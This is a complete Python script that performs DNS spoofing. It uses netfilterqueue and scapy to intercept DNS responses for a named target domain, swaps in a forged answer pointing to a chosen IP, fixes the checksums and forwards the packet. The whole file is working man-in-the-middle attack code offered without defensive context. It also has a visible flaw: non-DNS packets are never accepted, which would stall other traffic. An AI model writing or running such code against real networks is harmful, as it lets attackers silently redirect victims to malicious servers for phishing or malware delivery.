#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
TARGET_DOMAIN = b"www.freeversions.ru."
REDIRECT_IP = "8.8.8.8"
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if TARGET_DOMAIN in qname:
            print(f"[+] Spoofing target: {qname.decode()}-> {REDIRECT_IP}")
            answer = scapy.DNSRR(rrname=qname, rdata=REDIRECT_IP)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
        packet.accept()

def main():
  print("[*] DNS Spoofing started...")
  queue = netfilterqueue.NetfilterQueue()
  queue.bind(0, process_packet)
  queue.run()

if __name__ == "__main__":
  main()